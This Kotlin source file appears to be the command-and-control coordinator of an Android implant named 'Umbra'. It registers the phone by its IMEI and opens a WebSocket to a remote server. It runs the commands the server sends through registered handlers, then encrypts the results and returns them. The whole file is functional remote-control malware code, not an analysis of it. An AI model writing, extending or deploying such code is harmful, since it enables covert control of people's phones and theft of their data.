package org.umbra.core.c2

import android.content.Context
import android.util.Log
import org.umbra.core.core.CryptoEngine
import org.umbra.core.core.UmbraResponse
import kotlinx.coroutines.*
import kotlinx.serialization.json.Json

object C2Coordinator {
    private const val TAG = "Umbra.C2"
    private const val KEEPALIVE_INTERVAL_MS = 15_000L  // 15 second application-level ping

    private var ws: WebSocketTransport? = null
    private var fcmToken: String? = null
    private var c2BaseUrl: String = ""
    private var scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var deviceId: String = ""
    private var keepaliveJob: Job? = null

    fun start(
        context: Context,
        imei: String,
        serverUrl: String,
        token: String?,
        handlers: Map<String, suspend (Command) -> UmbraResponse>
    ) {
        deviceId = imei
        fcmToken = token
        c2BaseUrl = serverUrl

        CommandDispatcher.register(handlers)
        CommandDispatcher.setDeviceId(imei)

        ws = WebSocketTransport(
            serverUrl = serverUrl,
            onCommand = { cmd ->
                // Dispatch synchronously with timeout to avoid blocking WS thread forever
                kotlinx.coroutines.runBlocking {
                    val deferred = scope.async {
                        CommandDispatcher.dispatch(
                            Json { ignoreUnknownKeys = true }
                                .encodeToString(Command.serializer(), cmd)
                        )
                    }
                    val result = kotlinx.coroutines.withTimeoutOrNull(25_000) {
                        deferred.await()
                    } ?: "{\\\"type\\\":\\\"ErrorResponse\\\",\\\"error\\\":\\\"dispatch_timeout\\\"}"
                    CryptoEngine.encrypt(result)
                }
            },
            onStatus = { status -> Log.d(TAG, "WS: $status") }
        ).also { it.connect(imei) }

        Log.d(TAG, "Coordinator started — device=$deviceId")
    }

    fun stop() {
        keepaliveJob?.cancel()
        scope.cancel()
        ws?.disconnect()
    }

    fun updateFcmToken(token: String) {
        fcmToken = token
    }

    fun sendResult(payload: String) {
        ws?.send(CryptoEngine.encrypt(payload))
    }

    fun isConnected(): Boolean = ws?.isConnected() == true
}
